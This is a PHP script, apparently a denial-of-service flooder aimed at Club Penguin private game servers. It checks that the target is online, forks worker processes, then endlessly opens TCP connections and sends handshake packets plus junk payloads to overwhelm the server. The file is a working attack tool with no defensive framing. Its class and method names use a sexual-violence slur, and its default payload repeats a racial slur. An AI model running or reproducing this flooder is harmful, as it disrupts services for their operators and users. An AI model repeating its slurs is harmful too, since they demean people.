<?php
/* CPPS Flooder 1.5
 * @author: Sky
 * @desc: Floods a CPPS with rndK packets
*/
class CPPSRape {
	function __construct() {
		$this->config = parse_ini_file('config.ini');
		echo "  ___ ___ ___  ___   ___                \n";
		echo " / __| _ \ _ \/ __| | _ \__ _ _ __  ___ \n";
		echo "| (__|  _/  _/\__ \ |   / _` | '_ \/ -_)\n";
		echo " \___|_| |_|  |___/ |_|_\__,_| .__/\___|\n";
		echo "                             |_|        ";
		sleep(2);
		for($i = 0;$i < 50; $i++) {
			echo chr(8);
		}
		echo "\033[34m\033[1;34mMade by Sky\033[0m\r\n\n";
		if(!$this->config['Host']) die("Invalid Host.\n");
		if(!$this->config['Port']) die("Invalid Port.\n");
		if(!is_numeric($this->config['Port'])) die("Port is not numeric.\n");
		if(!$this->config['TCP']) $this->config['TCP'] = 'NIGGERS.NIGGERS.NIGGERS.NIGGERS.NIGGERS.NIGGERS';
		if($this->config['Threading'] == true) {
			if(!$this->config['Threads']) die("Invalid thread count.\n");
			if(!is_numeric($this->config['Threads'])) die("Invalid thread count.\n");
			echo "Threading: ON\n";
		}
		else echo "Threading: OFF\n";
		$this->pids = array();
		for($i=1;$i<$this->config['Threads'];$i++) {
			$pid = pcntl_fork();
			$pid ? pcntl_wait(&$status) : false;
			array_push($this->pids, $pid);
		}
		$this->checkGame();
		$this->rape();
	}
	public function checkGame() {
		$fp = @fsockopen($this->config['Host'], $this->config['Port'], $errno, $errstr, 4);
		$fp ? print("[FINE]Game is online.\n") : die("[CRITICAL]Game is offline.\n");
	}
	public function rape() {
		$c = 1;
		$rndK = "<msg t='sys'><body action='rndK' r='-1'></body></msg>".chr(0);
		$IP = $this->config['Host'];
		$Port = $this->config['Port'];
		$msg = $this->config['TCP'];
		echo "Packets sent: \r\n";
		while(true) {
			$fp = @fsockopen('tcp://'.$IP, $Port, $errno, $errstr, 4);
			if(!$fp) echo "\n[WARNING]Connection Timeout.\n";
			fwrite($fp, $rndK);
			usleep(1337);
			fwrite($fp, $msg);
			fclose($fp);
			$printstr =  $c;
			echo str_repeat(chr(8), strlen($printstr));
			echo $printstr;
			$c++;
		}
	}
	function __destruct() {
		echo "[DESTRUCTOR]Cleaning up..\n";
		foreach($this->pids as $pid) {
			posix_kill($pid, 9);
		}
	}
}
new CPPSRape();
?>